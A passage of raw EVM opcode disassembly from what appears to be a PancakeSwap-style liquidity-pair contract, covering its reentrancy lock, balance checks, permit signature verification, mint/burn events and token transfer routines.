ADD DUP1 PUSH2 0x2690 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1075 DUP11 DUP11 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x10B1 JUMPI PUSH1 0xB SLOAD PUSH2 0x10AD SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP6 SWAP1 MSTORE DUP2 MLOAD CALLER SWAP3 PUSH32 0x4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F SWAP3 DUP3 SWAP1 SUB ADD SWAP1 LOG2 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP SWAP5 SWAP7 SWAP6 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xE SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1174 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x1184 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP5 SWAP7 POP SWAP3 SWAP5 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND SWAP4 SWAP2 AND SWAP2 PUSH1 0x0 SWAP2 DUP5 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x11F4 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x120A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP3 POP PUSH1 0x0 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x126C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1282 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD ADDRESS PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SLOAD SWAP2 SWAP3 POP PUSH2 0x12A1 DUP9 DUP9 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x12B8 DUP5 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12BF JUMPI INVALID JUMPDEST DIV SWAP11 POP DUP1 PUSH2 0x12D3 DUP5 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x12DA JUMPI INVALID JUMPDEST DIV SWAP10 POP PUSH1 0x0 DUP12 GT DUP1 ISZERO PUSH2 0x12ED JUMPI POP PUSH1 0x0 DUP11 GT JUMPDEST PUSH2 0x1328 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x2627 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1332 ADDRESS DUP5 PUSH2 0x23E4 JUMP JUMPDEST PUSH2 0x133D DUP8 DUP14 DUP14 PUSH2 0x1C69 JUMP JUMPDEST PUSH2 0x1348 DUP7 DUP14 DUP13 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP10 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x13A2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x13B8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP7 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1404 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1418 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x142E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP4 POP PUSH2 0x143E DUP6 DUP6 DUP12 DUP12 PUSH2 0x1EB6 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x146E JUMPI PUSH1 0xB SLOAD PUSH2 0x146A SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH1 0xE SSTORE JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP13 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP13 SWAP1 MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP16 AND SWAP3 CALLER SWAP3 PUSH32 0xDCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496 SWAP3 SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP POP POP POP POP POP POP PUSH1 0x1 PUSH1 0xF DUP2 SWAP1 SSTORE POP SWAP2 POP SWAP2 JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST PUSH2 0x3E8 DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1559 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND SWAP5 SWAP1 SWAP4 AND SWAP3 PUSH2 0x1608 SWAP3 DUP6 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 DUP6 SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x15DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15F5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x166F SWAP3 DUP5 SWAP3 DUP8 SWAP3 PUSH2 0x1603 SWAP3 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x15CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x9 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x16DF JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F NOT DUP2 ADD SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 DUP6 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x17FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP PUSH1 0x40 MLOAD PUSH1 0x1F NOT ADD MLOAD SWAP2 POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1830 JUMPI POP DUP9 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ JUMPDEST PUSH2 0x1881 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1A PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E56414C49445F5349474E4154555245000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x188C DUP10 DUP10 DUP10 PUSH2 0x2079 JUMP JUMPDEST POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x18E2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x18F2 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1946 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x195A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1970 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19C3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x19D7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1A0C DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A29 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A37 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1A70 JUMPI PUSH2 0x1A5B PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1A6A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1A90 JUMP JUMPDEST PUSH2 0x1A8D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1ACF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25FF PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1AD9 DUP11 DUP11 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1B52 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1C62 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1BB7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1BCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C2E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C44 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xF SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D16 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1CF7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D78 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D7D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1DAB JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1DAB JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1DFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL 